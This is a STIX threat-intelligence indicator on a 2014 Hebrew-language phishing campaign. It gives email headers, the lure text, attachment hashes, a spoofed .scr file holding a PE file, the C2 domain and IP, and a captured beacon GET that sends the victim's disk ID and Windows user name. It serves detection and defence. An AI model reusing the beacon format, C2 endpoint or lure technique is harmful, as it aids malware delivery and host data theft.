stix:STIX_Header.stix:Title: Update to IB-14-10135A Hebrew Language Phishing Attempts
stix:STIX_Header.stix:Description:
On 16 March 2014 an organization observed a new version of the phishing emails reported in IB-14-10135A.
The malicious attachment drops malware that is coded with a different C2 URL for the same domain reported in IB-14-10135A.

stix:Indicator.indicator:Description:
On 16 March 2014, a phishing email was sent from xnxxnx02@gmail.com with a Hebrew language subject line, "הסקס הכי יפה בעולם". The email included the malicious attachment תיקח דשה.rar (MD5: D6347DCD712079B3096DCB596B80D09C). If installed successfully, the malware calls back to pstcmedia.com (188.40.81.136). Headers: Return-Path: Subject: =?utf-8?b?16HXp9ehINeZ16TXlCDXldee15TXoNeU?= X-SENDER-IP: 74.125.82.194 X-SENDER-REPUTATION: 4.8 Received: from mail-we0-f194.google.com ([74.125.82.194]) ; 16 Mar 2014 10:18:39 +0000 Received: by mail-we0-f194.google.com with SMTP id t61so1079231wes.1 ; Sun, 16 Mar 2014 03:18:37 -0700 (PDT) DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=gmail.com; s=20120113; h=mime-version:date:message-id:subject:from:to:content-type; bh=VXfMp+7Eqdse3OIXCRZx+IVZtGzbjlCVT8SQ0wH+SO0=; b=rdlGDd/xh7ywIsvyxuh+erHpQNiNHB7rfQEiXl+geGv51Q3qu/GWH7Q6+Wng9FNifS gLNd0fRxEYmRYJz9J97mFtP1lo8rzjftlpQq0zZ1a/go4IwCVHYVoPBmHgOpkNBDTLy6 3Fp5NguLmwQA3Y61jjQCEdsr03lCn7O0XF2RXW5A3lXLZox5rklCRhQfXDgkqaVVAUUR x3+kTycr0lwKb3iyRPMPsR0OpDT02OdJATa3bYyqwnVSVjFNX1Ffo+LhuAzLnSGusAbW y/kaYOYaN9Hhnl/9uVQGHpH6RaKxYGpSxxLwe8tAyPtWJ6ma+babco6mmJhqICLUwVBi sMOQ== MIME-Version: 1.0 X-Received: by 10.194.57.77 with SMTP id g13mr1123254wjq.42.1394958215809; Sun, 16 Mar 2014 01:23:35 -0700 (PDT) Received: by 10.216.116.198 with HTTP; Sun, 16 Mar 2014 01:23:35 -0700 (PDT) Date: Sun, 16 Mar 2014 10:23:35 +0200 Message-ID: From: xnxxnx x To: undisclosed-recipients:; Content-Type: multipart/mixed; boundary=047d7bacc0faf0854604f4b5042a --047d7bacc0faf0854604f4b5042a Content-Type: multipart/alternative; boundary=047d7bacc0faf0854304f4b50428 --047d7bacc0faf0854304f4b50428 Content-Type: text/plain; charset=UTF-8 Content-Transfer-Encoding: base64 16HXp9ehINeZ16TXlCDXldee15TXoNeUIOKApuKApg0KDQp3d3cueG54eC5jb20NCg== --047d7bacc0faf0854304f4b50428 Content-Type: text/html; charset=UTF-8 Content-Transfer-Encoding: quoted-printable

=D7=A1=D7=A7= =D7=A1 =D7=99=D7=A4=D7=94 =D7=95=D7=9E=D7=94=D7=A0=D7=94 =E2=80=A6=E2=80=A6

Email Body: סקס יפה ומהנה …… www.xnxx.com

This malware is coded with a different URL for the same domain reported in IB-14-10135A.
pstcmedia.com Resolution 16 February 2014: 188.40.81.136
GET /down/get_temp.php?name=VBOX-HARDDISK--1144079129 HTTP/1.1 Accept: text/* User-Agent: sk Accept-Language: en-us Content-Type: application/x-www-form-urlencoded REMOTE_USER: user [Windows profile name] Host: pstcmedia.com Cache-Control: no-cache
The email contains a malicious attachment תיקיה חדשה.rar (MD5 78b7d9b7a187e5e98e4ed918b7cac5e1). The .rar file contains a second file תיקיה חדשה.scr (MD5 747C67B647648A9A5A07B4CBEDA7F6A9).

The file תיקיה חדשה.scr (MD5 747C67B647648A9A5A07B4CBEDA7F6A9)despite a spoofed ".scr" extension is a RAR compressed archive containing a Windows PE file.
Note: The .scr extension, when used legitimately, is associated with Windows screen saver files.
For more information on the malware refer to IB-14-10135A.
